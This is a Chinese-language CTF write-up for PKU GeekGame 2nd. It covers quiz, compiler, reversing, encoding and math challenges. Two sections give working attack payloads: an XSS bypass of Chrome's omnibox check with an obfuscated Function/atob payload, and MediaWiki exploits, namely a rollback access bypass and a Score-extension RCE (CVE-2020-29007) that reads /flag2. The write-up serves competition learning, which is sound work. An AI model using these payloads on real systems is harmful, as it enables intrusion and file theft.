第二届北京大学信息安全综合能力竞赛（PKU GeekGame）的writeup，题目及官方题解：[geekgame-2nd](https://github.com/PKU-GeekGame/geekgame-2nd)。可惜最近太忙了，wish I have more time!

图：上次是Misc选手，这次是Algorithm选手，下次能不能争做web选手 XD

![](img/0.png)

## 签到

和上届完全一样，不确定是不是wingdings字体，总之复制到 txt 就变成了正常字符。得到两行字符，轮流读取得到flag。



## 小北问答·极速版

反复刷题，发现题库总共8道题，每次随机选7道。把题库扒出来：

1. > 在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 N 级关卡需要多少金钱？

   从[geekgame-1st](https://github.com/PKU-GeekGame/geekgame-1st)的write-up里可以找到第1关400分，第15关5900分。第16关6700分。假设所有关卡分数都是100的整数倍，且每次新增的分数保持不降，经过几轮试错可以算出1~15关的所有分数。

2. > 支持 WebP 图片格式的最早 Firefox 版本是多少？

   65，百度搜出来百度百科就有，谷歌还要往下翻好几条，百度赢麻了。

3. > 视频 bilibili.com/video/BV1EV411s7vu 也可以通过 bilibili.com/video/av_____ 访问。下划线内应填什么数字？

   用b站视频数据的接口查询av号：https://api.bilibili.com/x/web-interface/archive/stat?bvid=BV1EV411s7vu

4. > 北京大学某实验室曾开发了一个叫 gStore 的数据库软件。最早描述该软件的论文的 DOI 编号是多少？

   从官网：[关于我们](http://www.gstore.cn/pcsite/index.html#/regarding)找到最早发表在VLDB 2011上，根据名字和会议很容易查到。

5. > 每个 Android 软件都有唯一的包名。北京大学课外锻炼使用的最新版 PKU Runner 软件的包名是什么？

   下载下来在文件管理系统里找到：

   <img src="img/1.jpg" style="zoom:33%;" />

6. > 访问网址 “http://ctf.世界一流大学.com” 时，向该主机发送的 HTTP 请求中 Host 请求头的值是什么？

   浏览器监测一下网络流量，可以看到发出的请求是GET  http://ctf.xn--4gqwbu44czhc7w9a66k.com/，事实上xn--是将非ascii字符域名转化为标准域名的方式。

7. > 我刚刚在脑海中想了一个介于 9835337619 到 9835337778 之间的质数。猜猜它是多少？

   每次做题遇到的起止点都会变，且其中恰有8个质数。尝试记录每次猜答案的对错，但几乎遇不到相同的题目，不确定相同的题目答案是否相同，只能靠猜了。

8. > 我有一个朋友在美国，他无线路由器的 MAC 地址是 d2:94:35:21:42:43。请问他所在地的邮编是多少？ 

   查不到MAC地址，送命题，没得做，过。

这里前6题可以保证正确，第7题只有1/8的概率猜对，第8题没得做，但是我们只需要答对随机选出的7道题，放个脚本反复刷题总是有概率全对的。一个小坑是每次做完题最好多尝试几次接收信息，避免漏掉最后的flag。

脚本：`Q&A.ipynb`。



## 编原译理习题课

#### flag1：让 g++ 编译出的程序超过 8MB

```c++
using namespace std;
int main()
{ 
    static char padding[4096 * 4096] = {1};
}
```

只需要一个非常大的初始化……

#### flag2：让 g++ 输出的报错信息超过 2MB

```c++
using namespace std;
#define a string(1)
#define b a;a;a
#define c b;b;b
#define d c;c;c
#define e d;d;d
int main(){e;e;e}
```

发现int转string会有大段报错，所以只需要执行足够多次就够了。没有仔细研究，应该有更好的方法。

#### flag3：让 g++ 因为段错误而崩溃

```c++
// https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105289

template<typename T>
struct value_type;

template<template <typename Y, Y...> typename XList, typename T2, T2... Vs>
struct value_type<XList<T2, Vs...>>
{
    using type = T2;
};

template <typename List, typename value_type<List>::type Element>
struct push_front_vlist;

template <template <typename X, X...> typename XList, typename T, T Arg, T... Vs>
struct push_front_vlist<XList<T, Vs...>, Arg>
{
    using type = XList<T, Arg, Vs...>;
};
```

在GCC官方的bug tracker里找ICE（internal compiler error）漏洞报告，重点要找符合g++11版本的。



## Flag Checker

需要解析一个jar包，这里用的是Ghidra。Flag1的关键代码在GeekGame.class的actionPerformed函数里，对输入字符串Base64编码后做rot13，按代码复现一遍即可。

Flag2的关键代码在GeekGame.class的初始化函数里，看起来就很可疑的大段字符串处理后是一个函数定义：

```java
function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}
```

是一个以自身作为参数的函数，翻译成伪代码：

```python
seq = [0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232]
def mapping(x):
    return (checkflag2+"").charCodeAt(x)

def checkflag2(s):
    return JSON.stringfy(s.split("").map(charCodeAt(0)) 
                         == JSON.stringfy(seq.map(mapping)) ? 'Correct': 'Wrong'
```

即要求按照seq的顺序提取checkflag2自身相应位置的字符，得到flag{javascript-obfuscator}。

代码：`FlagChecker.ipynb`。



## 给钱不要！

目标网站的漏洞很明显，是把输入的字符串直接用作跳转网址了：

```html
<script>
function go() {
    location.href = document.getElementById('filename').value + '.jpg';
}
</script>
```

这是一个常见的xss漏洞，正常情况下href是跳转到当前网址的子页面，即`http://host.com/current_page/href`，但其开头是`http://`，`//` 或 `javascript:` 时，就会从当前网站直接跳出去，或直接执行相应的js命令。

这道题中，受害者（`prob06-xssbot.py`）的行为逻辑是：

```python
# 1. 检查异常字符
assert all(0x20<=ord(c)<=0x7e for c in text) and len(text)<=4000 and '%' not in text

# 2. 用chrome://omnibox检查输入字符串类型
# 移除开头的网络协议['http://', 'https://', 'file://']，然后根据omnibox的类型判断定义安全度
# 'query': very_safe, 'unknown': safe, other: dangerous

# 3. 将flag2放在网页中，然后在网页上输入我们的代码，输出网页的title
# 4. 若输入是very_safe且title为特定字符串，则输出flag1
```

#### flag1

需要欺骗omnibox输入是query类型，但实际上是一个网址，从而跳转到任意网页（例如我们自己的服务器）让bot看到指定的标题。乍一看非常困难，相当于在chrome中输入真实网址不会自动跳转，而是被识别为query进入谷歌搜索，很难相信chrome会有这种漏洞，因此问题很可能出在bot自作主张移除网络协议的这一步。

一个标准的网址格式是`scheme://username:password@host:port/path?query#fragment`，这些符号都有特定的含义，不太可能通过混淆让chorme分段出错。具体分析omnibox解析输入的[代码逻辑](https://blog.csdn.net/xingtian713/article/details/4516738)和[关键源码](https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235)，发现关键在于”用户没有输入scheme时，需要分辨URL和query“。所以目标是输入`http://`时能作为URL，但去掉之后能逃脱这段检查：

1. username包含空格，则判定为unknown：e.g. `a a@baidu.com`
2. host为ipv4地址，1 < num_ipv4_components < 4 且结尾没有slash，则判定为query：e.g. `0xaa.0xaa.0xaaaa:port`

由于实际输入是构造的地址加上`.jpg`，为了回避slash构造出如下格式的payload：`http://0xaa.0xa.0xaaaa:1111?`，在自己的服务器上搭建一个简易flask，title写成目标字符串，拿到flag1。

#### flag2

只有将flag从网页中转移到标题上才能拿到，因此需要注入javascript代码，且不被omnibox识破。在JavaScript单词中间插入一个"\t"就可以骗过omnibox，可惜这道题限制了可用字符，只能在代码上做文章。源码中对js的判断非常简单，只要符合正则`(?i)javascript:([^;=().\"]*)`就不判为URL。代码中不包含特殊字符可以用eval+unicode或者JSF**k来处理，但不包含小括号比较麻烦，需要用匿名函数+反引号处理，payload如下：

```javascript
// 原始payload
document.title=document.querySelector('.flag').textContent
// 匿名函数结构，用反引号传参
Function`a${ payload }` ``
// 实际payload，对代码进行base64编码，结尾的注释符用于过滤bot加上的.jpg后缀
Function`a${atob`ZG9jdW1lbnQudGl0bGU9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmZsYWcnKS50ZXh0Q29udGVudDsg`}``` //
```

代码：`xss.ipynb`。记录一些好用的资料：

[强防御下的XSS绕过思路（一）](https://mp.weixin.qq.com/s?__biz=MzAwNTgyODU3NQ==&mid=2651068626&idx=1&sn=fa9cde874e72f7a32eb40028e2b836b9&chksm=80e60262b7918b74bc5e96023e62860b31b5859cc4474aaccb00aa8660c27e97a6da2ccaecae&scene=21#wechat_redirect)、[（二）](https://mp.weixin.qq.com/s?__biz=MzAwNTgyODU3NQ==&mid=2651073035&idx=1&sn=ef1a8238c0d9cca1fecc296cc83b7704&chksm=80e630bbb791b9ad9b566e4f8e72026858d19c1d46736baafe582117a4e209f3d44dfc714ad1&scene=21#wechat_redirect)、[（三）](https://mp.weixin.qq.com/s?__biz=MzAwNTgyODU3NQ==&mid=2651074569&idx=1&sn=d26b984454cb8d8b7f89bc8b9d97e208&chksm=80e62ab9b791a3af3cbbb1ef123a88bdd1f28ae11531a2fcadec1b33b66cf215244086aa6f46&scene=21#wechat_redirect)、[（四）](https://cn-sec.com/archives/225803.html)

![](img/2.png)



## 私有笔记

攻击目标是MediaWiki，搜索MediaWiki相关的安全漏洞，发现2021年12月的[版本更新](https://www.mediawiki.org/wiki/2021-12_security_release/FAQ)提到了一系列无权限任意访问的漏洞，和首页查到的版本号刚好一致。说明里明确提到了action=rollback&from={{:private page}}这种攻击方式。首页提示了flag的页面名是`Flag`，替换到payload里即可获取Flag页面的内容，拿到flag1。

flag2的提示是尝试RCE，二阶段提示了漏洞来源是Score扩展。查到了[CVE-2020-29007](https://github.com/seqred-s-a/cve-2020-29007)和官方的[讨论串](https://phabricator.wikimedia.org/T257062)，尝试并简化后，获得RCE的执行模板：

```
<score>\new Staff <<{c^# 

[scheme code goes here] 

}>></score>
```

这里用的是scheme语言，根据[入门教程](https://deathking.github.io/yast-cn/)设计了文件读取的代码，效果如下：

```scheme
# 1. 确认flag2的位置
(if (file-exists? "/flag2") "true" "false") 

# 2. 尝试获取系统信息
(object->string (uname))

# 3. 文件读取
(object->string (read (open-input-file "/flag2")))
```

![image-20221126173908465](img/3.png)



## 381654729

要求找到16进制下任意前n位都能整除n的数。由于满足条件的n位数，前n-1位一定也满足条件，记忆化搜索即可。符合条件的数最大只有39位，依次检查3个满足条件的数找到flag。

代码：`381654729.ipynb`。




## 乱码还原

首先审计源码，两个flag都是先用Encrypt函数加密为佛语，然后依次用UTF-8和shift_jis编码，后者编码过程中会损失部分信息，相当于以字节为单位的部分缺失。

flag1长度很短，可以通过递归搜索的方式插入可能的字节，暴力枚举原始字符串。

对于flag2，需要分析shift_jis编码前后的数据特点。佛语的UTF-8编码全都是3个字节，第一个字节都在0xe3-0xe9之间，且后两个字节没有超过0xe0的数据，因此大于0xe0的字节相当于佛语的单字分隔符。在shift_jis编码中一个字符占两个字节，根据编码规范，大于0xe0的字节作为第一个字节或第二个字节都可以，也不存在无法编码的情况。总之，这种字节可以作为严格的佛语划分标准。

按大于0xe0的字节划分后，发现共有27466个佛语字符，其中4712个丢了一个字节，83个丢了两个字节。对每个佛语字符枚举可能丢失的字节内容，得到一个很大的候选集合，接下来就要考虑怎样缩小搜索范围，找出真正合法的序列。

用”合法序列“代指shift_jis编码后与密文相同的序列，则合法序列的前缀必然也能编码出密文的前缀。由于不同的合法序列差异只在于无法编码被丢掉的字节，两个合法序列以佛语字符为单位任意重组也是合法的，因此完全可以用任意一个的前缀作为基准，判定后续的佛语编码后是否与密文相同。算法实现上，对每个有多种可能的佛语字符进行遍历，将其拼接到现有合法序列的后面以检查其合法性，一次遍历后得到剩余的佛语方案和一个模板串，包括55个有2种候选方案的佛语字符和2个有3种候选方案的佛语字符。

到这一步，超过2^55种组合方案全都可以正确编码为密文，但数量还是太多。下一步是保证佛语能够正确解码。Decrypt函数对佛语依次做了AES-256-CBC解码和utf-16le解码的处理，尝试用Decrypt处理模板串，发现在utf-16le解码这一步报错。由于AES是从前到后的分组加密，后面的加密不会影响前面的加密结果，因此可以从前往后逐个尝试佛语字符的替换方案，根据utf-16le报错的位点确定佛语是否正确，直到编码正确为止。

至此，已经解出了唯一的佛语序列，还需要用b16decode, b32decode, b64decode, b85decode, a85decode组成的随机序列解码10次。好在这些编码方式的字符集特点相当明确，每次解码都可以确定唯一的解码方式，10次之后得到utf-8编码的序列，再次解码得到flag。

代码：`codes.ipynb`。



## 方程组

审计源码，是用n个质数平方根循环位移得到n×n的系数矩阵A，用flag的ascii码作为向量x，乘积b=Ax，已知A和b求解x。

#### flag1

已知x长度是26，已知A和b，直接用python的`scipy.optimize.nnls`或`numpy.linalg.solve`求解方程组，结果四舍五入取整即可。

#### flag2

已知x长度是28，已知A，但只知道b的前18位。可以猜出x前5位是`flag{`，把x的后5位用均值替换，求解这个18元线性方程组，得到中间18位是`y1v^are_b_fpufLg|`，根据词义和语法猜出前几位应该是`y0u_are_a_`。再次将前10位`flag{y0u_ar`作为常数代入，精确解出后几位，最后得到`flag{y0u_are_a_good_guesser}`。

#### flag3

这次只给了一个方程，但是提供了200位有效数字的精度，变成了大系数的多元一次整数不定方程问题。没想到做法。

代码：`equation.ipynb`。
